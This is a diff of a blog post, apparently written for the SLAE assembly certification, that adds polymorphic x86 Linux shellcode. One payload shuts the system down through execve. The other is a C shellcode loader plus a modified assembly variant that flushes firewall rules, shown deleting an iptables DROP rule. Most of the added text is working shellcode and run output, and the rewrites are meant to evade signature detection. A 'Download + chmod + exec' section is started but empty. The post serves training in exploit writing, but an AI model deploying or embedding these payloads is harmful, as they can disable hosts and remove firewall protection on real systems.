@@ -75,30 +75,181 @@ return 0;
 I extracted the assembly code and modified it manually:
 
 ```asm
-xor    ecx,ecx                      ; clear ecx
-mul    ecx                          ; clear both eax and edx
-push   edx                          ; push edx instead of eax
-push  0x682d                       ; -h option
-mov    edi,esp                      ; save stack pointer to edi
-push   eax                          ; push null
-push   0x6e                         ; "n" character
-push   0x6f                         ; "o" character
-push   0x77                         ; "w" character
-mov    edi,esp                      ; save stack pointer to edi
-push   eax                          ; push null
-push   0x6e776f64                   ; these four push instructions correspond to /sbin///shutdown
-push   0x74756873
-push   0x2f2f2f6e
-push   0x6962732f
-mov    ebx,esp                      ; save stack pointer to ebx
-push   edx                          ; push null
-push   esi
-push   edi                          ; points to "-h now"
-push   ebx                          ; points to /sbin///shutdown
-mov    ecx,esp                      ; save stack pointer to ecx
-mov    al,0xc-1                     ; 0xc - 1 = 0xb which is execve() syscall
-int    0x80                         ; Execute syscall
+;---------------------------------
+;
+; Author: dubs3c
+;
+; Purpose:
+; Create a polymorphic version of
+; "shutdown -h now Shellcode" from
+; shell-storm.org
+;
+; SLAE Assignment 6
+;
+;----------------------------------
+
+global _start
+
+section .text
+
+_start:
+
+    xor    ecx,ecx                      ; clear ecx
+    mul    ecx                          ; clear both eax and edx
+    push   edx                          ; push edx instead of eax
+    push word 0x682d                    ; -h option
+    mov    edi,esp                      ; save stack pointer to edi
+    push   eax                          ; push null
+    push byte 0x6e                      ; "n" character
+    mov byte [esp+1], 0x6f              ; "o" character
+    mov byte [esp+2], 0x77              ; "w" character
+    mov    edi,esp                      ; save stack pointer to edi
+    push   eax                          ; push null
+    push   0x6e776f64                   ; these four push instructions correspond to /sbin///shutdown
+    push   0x74756873
+    push   0x2f2f2f6e
+    push   0x6962732f
+    mov    ebx,esp                      ; save stack pointer to ebx
+    push   edx                          ; push null
+    push   esi
+    push   edi                          ; points to "-h now"
+    push   ebx                          ; points to /sbin///shutdown
+    mov    ecx,esp                      ; save stack pointer to ecx
+    mov    al,0xc-1                     ; 0xc - 1 = 0xb which is execve() syscall
+    int    0x80                         ; Execute syscall
 ```
+
+Running the modified version returns:
+
+```
+dubs3c@slae:~/SLAE/EXAM/github/assignment_6$ ./shellcode
+Shellcode length:  59
+shutdown: Need to be root
+```
+
+Nice! We only added 3 extra bytes. Running the program as `root` shuts down the computer.
+
+## Shellcode 2:  40 byte shellcode to flush ipchains for Linux x86
+
+The purpose of the next shellcode is to delete all ipchains entries. So any firewall rules set in place will be wiped out.
+
+```c
+/* By Kris Katterjohn 11/18/2006
+ *
+ * 40 byte shellcode to flush ipchains for Linux x86
+ *
+ *
+ *
+ * section .text
+ *
+ *      global _start
+ *
+ * _start:
+ *
+ * ; execve("/sbin/ipchains", { "/sbin/ipchains", "-F", NULL }, NULL)
+ *
+ *      push byte 11
+ *      pop eax
+ *      cdq
+ *      push edx
+ *      push word 0x462d
+ *      mov ecx, esp
+ *      push edx
+ *      push word 0x736e
+ *      push 0x69616863
+ *      push 0x70692f6e
+ *      push 0x6962732f
+ *      mov ebx, esp
+ *      push edx
+ *      push ecx
+ *      push ebx
+ *      mov ecx, esp
+ *      int 0x80
+ */
+
+main()
+{
+       char shellcode[] =
+               "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x46\x89"
+               "\xe1\x52\x66\x68\x6e\x73\x68\x63\x68\x61"
+               "\x69\x68\x6e\x2f\x69\x70\x68\x2f\x73\x62"
+               "\x69\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";
+
+       (*(void (*)()) shellcode)();
+}
+```
+
+Because I don't have the command `ipchains` on my system, I cheated a little bit att created the following script in `/sbin/ipchains`:
+
+```bash
+#!/bin/bash
+
+/sbin/iptables "$@"
+```
+
+The modified shellcode can be seen below. Comments starting with `[M]` indicates that the instruction has been modified.
+
+```asm
+section .text
+
+global _start
+
+_start:
+    xor ecx, ecx            ; [M] zero out ecx
+    mul ecx                 ; [M] zero out edx and eax
+    push byte 10            ; [M]
+    pop eax                 ; eax = 10
+    push ecx                ; push ecx instead of edx
+    push 0x2d               ; [M] "-" char
+    mov byte [esp+1], 0x46  ; [M] "F" char
+    mov ecx, esp            ; save current stack pointer to ecx
+    push edx                ; push null
+    push word 0x736e        ; following 4 push instructions form /sbin/ipchains
+    push 0x69616863
+    push 0x70692f6e
+    push 0x6962732f
+    push 0xdeadbeef         ; [M] add some nonsese
+    pop edi                 ; [M]
+    mov ebx, esp            ; save currrent stack pointer to ebx
+    push edx                ; push null
+    push ecx                ; points to "-F"
+    push ebx                ; points to /sbin/ipchains
+    xor ecx, ecx            ; [M] add some nonsense
+    mov edi, esp            ; [M] add some nonsense
+    xchg ecx, edi           ; [M] save current stack pointer to ecx
+    inc eax                 ; [M] syscall 11: execve()
+    int 0x80                ; execute syscall
+```
+
+The output below shows how the shellcode deletes a `DROP` rule from iptables:
+
+```
+dubs3c@slae:~/SLAE/EXAM/github/assignment_6$ sudo iptables -L
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination
+DROP       all  --  192.168.1.254        anywhere
+
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination
+dubs3c@slae:~/SLAE/EXAM/github/assignment_6$ sudo ./shellcode
+Shellcode length:  57
+dubs3c@slae:~/SLAE/EXAM/github/assignment_6$ sudo iptables -L
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination
+
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination
+```
+
+The modified shellcode increased with 17 bytes which is still under 50% increase.
+
+## Shellcode 3: Download + chmod + exec - 108 bytes
 
 ---
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
